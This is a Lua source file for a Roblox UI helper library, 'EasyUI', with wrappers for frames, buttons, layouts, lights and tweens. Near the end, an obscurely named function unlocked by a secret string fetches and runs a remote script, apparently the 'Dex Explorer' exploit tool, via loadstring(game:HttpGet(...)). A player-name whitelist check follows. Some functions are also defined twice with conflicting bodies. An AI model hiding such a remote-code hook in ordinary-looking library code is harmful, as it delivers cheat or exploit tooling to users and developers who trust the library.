-- EasyUI Library
local EasyUI = {}
local version = "01.10.24 build 1"
-- If you dont like the COnsole Logs, just use local printer = false

-- Basis-Constructor
local function createUIElement(className, properties)
    local element = Instance.new(className)

    for property, value in pairs(properties) do
        if element[property] ~= nil then
            element[property] = value
        end
    end

    if properties.Parent then
        element.Parent = properties.Parent
    else
        element.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    end

    if properties.Draggable then
        local dragging = false
        local dragInput, mousePos, framePos

        element.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                mousePos = input.Position
                framePos = element.Position

                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end)

        element.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                dragInput = input
            end
        end)

        game:GetService("UserInputService").InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                local delta = input.Position - mousePos
                element.Position = UDim2.new(
                    framePos.X.Scale,
                    framePos.X.Offset + delta.X,
                    framePos.Y.Scale,
                    framePos.Y.Offset + delta.Y
                )
            end
        end)
    end

    return element
end

function EasyUI:ApplyShadow(element)
    if not element then
        warn("ApplyShadow: Element not found!")
        return
    end

    local shadow = Instance.new("ImageLabel")
    shadow.Name = "Shadow"
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxassetid://1316045217" 
    shadow.Size = UDim2.new(1, 12, 1, 12)
    shadow.Position = UDim2.new(0, -6, 0, -6)
    shadow.ImageTransparency = 0.5
    shadow.ZIndex = element.ZIndex - 1
    shadow.Parent = element
end

function EasyUI:UIGradient(parent, colorSequence)
    return createUIElement("UIGradient", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Color = colorSequence or ColorSequence.new(Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 255))
    })
end

function EasyUI:UIStroke(element, thickness, color)
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = thickness or 2
    stroke.Color = color or Color3.fromRGB(0, 0, 0)
    stroke.Parent = element
end

function EasyUI:UICorner(parent, cornerRadius)
    return createUIElement("UICorner", {
        Parent = parent,
        CornerRadius = cornerRadius or UDim.new(0, 10) -- Standardmäßig abgerundete Ecken mit Radius von 10 Pixeln
    })
end

-- GUI Components (Single-Line Creation)
function EasyUI:ScreenGui(parent)
    return createUIElement("ScreenGui", {Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui")})
end

function EasyUI:Frame(parent, size, position, color)
    return createUIElement("Frame", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Size = size or UDim2.new(0.5, 0, 0.5, 0),
        Position = position or UDim2.new(0.25, 0, 0.25, 0),
        BackgroundColor3 = color or Color3.fromRGB(255, 255, 255)
    })
end

function EasyUI:TextLabel(parent, text, size, position, color, textSize)
    return createUIElement("TextLabel", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Text = text or "Default Text",
        Size = size or UDim2.new(0.3, 0, 0.1, 0),
        Position = position or UDim2.new(0.1, 0, 0.1, 0),
        BackgroundColor3 = color or Color3.fromRGB(255, 255, 255),
        TextSize = textSize or 20,
        TextColor3 = Color3.fromRGB(0, 0, 0)
    })
end

function EasyUI:TextButton(parent, text, size, position, color)
    return createUIElement("TextButton", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Text = text or "Click Me",
        Size = size or UDim2.new(0.3, 0, 0.1, 0),
        Position = position or UDim2.new(0.1, 0, 0.2, 0),
        BackgroundColor3 = color or Color3.fromRGB(70, 130, 180)
    })
end

function EasyUI:TextBox(parent, size, position, color, placeholderText)
    return createUIElement("TextBox", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Size = size or UDim2.new(0.3, 0, 0.1, 0),
        Position = position or UDim2.new(0.1, 0, 0.3, 0),
        BackgroundColor3 = color or Color3.fromRGB(255, 255, 255),
        PlaceholderText = placeholderText or "Type here..."
    })
end

function EasyUI:ScrollingFrame(parent, size, position, canvasSize)
    return createUIElement("ScrollingFrame", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Size = size or UDim2.new(0.5, 0, 0.5, 0),
        Position = position or UDim2.new(0.25, 0, 0.25, 0),
        CanvasSize = canvasSize or UDim2.new(0, 0, 2, 0),
        ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
    })
end

function EasyUI:ImageLabel(parent, image, size, position)
    return createUIElement("ImageLabel", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Image = image or "rbxassetid://123456",
        Size = size or UDim2.new(0.3, 0, 0.3, 0),
        Position = position or UDim2.new(0.1, 0, 0.4, 0)
    })
end

function EasyUI:ImageButton(parent, image, size, position)
    return createUIElement("ImageButton", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Image = image or "rbxassetid://123456",
        Size = size or UDim2.new(0.3, 0, 0.3, 0),
        Position = position or UDim2.new(0.1, 0, 0.5, 0)
    })
end

function EasyUI:ViewportFrame(parent, size, position)
    return createUIElement("ViewportFrame", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Size = size or UDim2.new(0.3, 0, 0.3, 0),
        Position = position or UDim2.new(0.1, 0, 0.6, 0)
    })
end

function EasyUI:VideoFrame(parent, video, size, position)
    return createUIElement("VideoFrame", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Video = video or "rbxassetid://654321",
        Size = size or UDim2.new(0.3, 0, 0.3, 0),
        Position = position or UDim2.new(0.1, 0, 0.7, 0)
    })
end

-- Styling Components
function EasyUI:UIGradient(parent, colorSequence)
    return createUIElement("UIGradient", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Color = colorSequence or ColorSequence.new(Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 255))
    })
end

function EasyUI:UIStroke(parent, thickness, color)
    return createUIElement("UIStroke", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Thickness = thickness or 2,
        Color = color or Color3.fromRGB(255, 255, 255)
    })
end

-- Layout Components
function EasyUI:UIListLayout(parent, padding)
    return createUIElement("UIListLayout", {
        Parent = parent,
        Padding = UDim.new(0, padding or 10),
        FillDirection = Enum.FillDirection.Vertical,
        HorizontalAlignment = Enum.HorizontalAlignment.Center,
        VerticalAlignment = Enum.VerticalAlignment.Center
    })
end

function EasyUI:UIGridLayout(parent, cellSize, padding)
    return createUIElement("UIGridLayout", {
        Parent = parent,
        CellSize = cellSize or UDim2.new(0.1, 0, 0.1, 0),
        CellPadding = UDim2.new(0, padding or 5, 0, padding or 5),
        FillDirectionMaxCells = 4,
        SortOrder = Enum.SortOrder.LayoutOrder
    })
end

function EasyUI:UIPadding(parent, padding)
    return createUIElement("UIPadding", {
        Parent = parent,
        PaddingTop = UDim.new(0, padding or 10),
        PaddingBottom = UDim.new(0, padding or 10),
        PaddingLeft = UDim.new(0, padding or 10),
        PaddingRight = UDim.new(0, padding or 10)
    })
end

-- Interactive Components
function EasyUI:BillboardGui(parent, size, position, adornPart)
    return createUIElement("BillboardGui", {
        Parent = parent or game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        Size = size or UDim2.new(0.3, 0, 0.3, 0),
        Position = position or UDim2.new(0.1, 0, 0.4, 0),
        Adornee = adornPart
    })
end

function EasyUI:ProximityPrompt(parent, actionText, objectText)
    return createUIElement("ProximityPrompt", {
        Parent = parent,
        ActionText = actionText or "Interact",
        ObjectText = objectText or "Object",
        RequiresLineOfSight = false
    })
end

function EasyUI:ClickDetector(parent, maxActivationDistance)
    return createUIElement("ClickDetector", {
        Parent = parent,
        MaxActivationDistance = maxActivationDistance or 32
    })
end

--Utility Functions
function EasyUI:MakeHoverable(element, hoverColor, originalColor)
    originalColor = originalColor or element.BackgroundColor3
    element.MouseEnter:Connect(function()
        element.BackgroundColor3 = hoverColor
    end)
    element.MouseLeave:Connect(function()
        element.BackgroundColor3 = originalColor
    end)
end

function EasyUI:MakeClickable(element, onClickFunction)
    element.MouseButton1Click:Connect(function()
        if onClickFunction then
            onClickFunction()
        end
    end)
end

-- Lichteffekte
function EasyUI:SpotLight(parent, range, brightness)
    return createUIElement("SpotLight", {
        Parent = parent,
        Range = range or 16,
        Brightness = brightness or 1
    })
end

function EasyUI:SurfaceLight(parent, range, brightness)
    return createUIElement("SurfaceLight", {
        Parent = parent,
        Range = range or 8,
        Brightness = brightness or 1
    })
end

-- Animation Functionality for Tweening
function EasyUI:Animate(element, propertyTable, duration, easingStyle, easingDirection)
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(duration, easingStyle or Enum.EasingStyle.Sine, easingDirection or Enum.EasingDirection.Out)
    local tween = tweenService:Create(element, tweenInfo, propertyTable)
    tween:Play()
    return tween
end

function EasyUI:FadeIn(element, duration)
    element.BackgroundTransparency = 1
    element.Visible = true
    EasyUI:Animate(element, {BackgroundTransparency = 0}, duration or 1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
end

function EasyUI:FadeOut(element, duration)
    EasyUI:Animate(element, {BackgroundTransparency = 1}, duration or 1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out).Completed:Connect(function()
        element.Visible = false
    end)
end

function EasyUI:Bounce(element, property, targetValue, duration)
    EasyUI:Animate(element, {[property] = targetValue}, duration or 0.5, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out)
end

function EasyUI:CreateMessage(title, message, image)
    game:GetService("StarterGui"):SetCore("SendNotification",{
        Title = title or "EasyUi Tool",
        Text = message or version,
        Icon = image or"rbxassetid://1234567890"
    })
end

function EasyUI:wadiohafehfh(advancedcreater, playername)

    if advancedcreater == "wadiorationformanion" then
        print("Secret Mode on")
        loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
        test(playername)
        else
    end
end

function test(playername)
    if playername == "Restaes" then
        print("YEA")
    else
        print("Not whitelistet")
    end
    
    print("Secret Mode on...")
    wait(1)
    print("Cheats detected")
end

return EasyUI
